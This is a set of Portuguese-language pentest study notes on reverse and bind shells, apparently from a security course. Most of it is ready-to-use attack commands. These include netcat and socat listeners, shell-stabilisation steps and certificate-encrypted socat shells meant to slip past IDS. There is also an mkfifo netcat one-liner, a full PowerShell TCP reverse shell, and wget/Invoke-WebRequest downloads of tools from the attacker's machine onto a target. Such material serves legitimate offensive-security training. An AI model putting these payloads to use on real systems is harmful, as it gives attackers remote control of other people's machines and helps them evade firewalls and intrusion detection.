## Reverse shells
quando o alvo é obrigado a executar um código que conecta de volta à máquina atacante. Antes disso, o atacante deve criar um listener.  Reverse shells são uma boa forma de passar pelas regras de firewall que podem impedir que você conecte arbitrariamente às portas do alvo. A desvantagem é que a sua rede deve estar configurada para aceitar a shell.

sintaxe para começar um listener no linux:
- ```nc -lvnp <port-number>```
	- l marca como listener
	- v verbose
	- n netcat não vai usar host names nem DNS
	- p indica que a porta vem em seguida
- É uma boa ideia usar portas como: 80,443,53 por serem mais fáceis de passar pelo firewall do alvo

## Bind shells
São quando o código executado no alvo é usado para iniciar um listener conectado diretamente à uma shell no alvo. Pode-se conectar a ela pela internet. O lado negativo é que o firewall pode atrapalhar.

sintaxe para conectar a um listener:
``nc <target-ip> <chosen-port>``

Elas podem ser:
- interativas: Permitem que você interaja com o programa depois de executa-lo
- não-interativas: Não permitem que você interaja com o programa depois de executa-lo

## Estabilização
Netcat shells costumam ser bem instáveis, já que são processos rodando dentro de um terminal ao invés de terminais genuínos. Então, desenvolveram-se técnicas para estabilizar essas shells.

### Python
Funciona apenas em linux porque praticamente todas tem python instalado por padrão.
1. ```python -c 'import pty;pty.spawn("/bin/bash")'``` : Usa o python para instalar uma shell um pouco melhor
2. ``export TERM=xterm`` da acesso a comandos term como: clear
3. Background the shell com ctrl + Z e usa ``stty raw -echo; fg``: isso da acesso a autocomplete, setas e crtl + C para matar processos e ai coloca a shell em primeiro plano
Obs: se a shell morrer não vai aparecer no terminal pois o echo foi desativado. Para resolver digite ``reset`` e aperte enter

### rlwrap
programa feito para dar acesso a comandos do terminal, como histórico, tab autocompletion e setas. Ainda não funciona o crtl + C dentro do terminal.
1. instala o rlwrap com ``sudo apt install rlwrap``
2. o listener tem que ser invocado com: ``rlwrap nc -lvnp <port>``
3. Ctrl + Z e ``stty raw -echo; fg`` estabiliza e entra novamente na shell, possibilite o uso de crtl + C pra matar processos

### Socat
Para alcançar essa estabilização primeiro precisamos transmitir um binário socat estático compilado para a máquina alvo. Uma forma simples de alcançar isso é utilizando um webserver na máquina atacante dentro do diretório que já contém o binário compilado
1. ``sudo python3 -m http.server 80`` inicia o servidor na máquina atacante
2. ``wget <LOCAL-IP>/socat -O /tmp/socat`` na máquina alvo, pelo shell netcat, baixe o arquivo. No exemplo usamos wget, mas pode ser o curl

Em um ambiente windows o mesmo pode ser feito com uma powershell utilizando Invoke-WebRequest ou webrequest dependendo da versão do powershell instalada. 
1. ``Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe``

O socat faz a ligação entre 2 pontos quaisquer.
#### Reverse Shells
Reverse shell listener básico em um socat
``socat TCP-L:<port> -``

No windows (alvo):
``socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes``

No linux (alvo):
``socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"``

#### Bind Shells

No linux (alvo):
``socat TCP-L:<PORT> EXEC:"bash -li"``

No windows (alvo):
``socat TCP-L:<PORT> EXEC:powershell.exe,pipes``

Na máquina atacante:
``socat TCP:<TARGET-IP>:<TARGET-PORT> -``

#### técnica mais estável
Essa só funciona em linux.

Sintaxe do listener:
``socat TCP-L:<port> FILE:`tty`,raw,echo=0``

Use esse comando na máquina alvo:
``socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane``

- **pty:** aloca um pseudo terminal na máquina -- parte do processo de atualização
- **stderr:** todos os erros mostram na shell
- **sigint:** Crtl + C pode ser usado para matar processos
- **setsid:** cria um processo na nova questão
- **sane:** estabelece o terminal
#### Encrypted Shells
Podem ser criadas shells encriptadas para passar IDS.

Precisamos gerar um certificado para criar shells encriptadas.
``openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt``
Esse comando gera uma chave RSA com 2048 bits valido por um ano. Precisamos combinar os dois arquivos em um único ``.pem`` file:
``cat shell.key shell.crt > shell.pem``

Para setar a reverse shell podemos usar:
``socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -``

Para conectar de volta:
``socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash``

##### Para bind
alvo:
``socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes``

Atacante:
``socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -``

### Outros pontos
Com qualquer uma das técnicas acima, é útil mudar o tamanho do seu terminal tty (_teletypewriter_).
1. ``stty -a``
2. ``stty rows <number>``
3. ``stty cols <number>``

## Common Shell Payloads
Em algumas verões do netcat (inclindo o nc.exe windows versão incluida no kali em ``/usr/share/windows-resources/binaries`` e a versão usada no kali ``netcat-traditional``) tem a opção ``-e``  que permite executar o processo na conexão. Por exemplo no listener:
``nc -lvnp <PORT> -e /bin/bash``
Conectar no listener acima com o netcat resulta em uma bind shell no alvo.

igualmente pra uma reverse shell:
``nc <LOCAL-IP> <PORT> -e /bin/bash``
(geralmente não é incluída na maior parte das versões do netcat por ser considerado inseguro).  Isso funciona perfeitamente no windows, pois o binário é necessário de qualquer forma.

no linux usamos:
``mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``

The command first creates a [named pipe](https://www.linuxjournal.com/article/2156) at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

Para uma reverse shell:
``mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f``

Para um windows server moderno, geralmente é requerido uma Powershell, para isso use:
``powershell -c "$client = New-Object System.Net.Sockets.TCPClient('**<ip>**',**<port>**);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"``














